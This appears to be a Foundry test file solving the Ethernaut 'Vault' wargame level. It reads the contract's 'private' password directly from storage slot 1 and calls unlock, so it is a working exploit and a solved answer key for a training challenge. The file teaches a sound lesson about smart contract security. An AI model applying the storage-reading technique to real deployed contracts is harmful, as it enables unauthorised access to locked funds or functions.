// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {VaultFactory} from "../src/Vault/VaultFactory.sol";
import {Vault} from "../src/Vault/Vault.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;
    address payable player;

    function setUp() public {
        ethernaut = new Ethernaut();
        player = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("player")))))
        );
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testExploit() public {
        // Register level with Ethernaut contract
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);

        // Get a new level instance
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault vaultInstance = Vault(payable(levelAddress));

        // Simulate exploit
        bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1)));
        vaultInstance.unlock(password);
        assertFalse(vaultInstance.locked());

        // Submit level
        bool levelSuccessFullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessFullyPassed);
    }
}
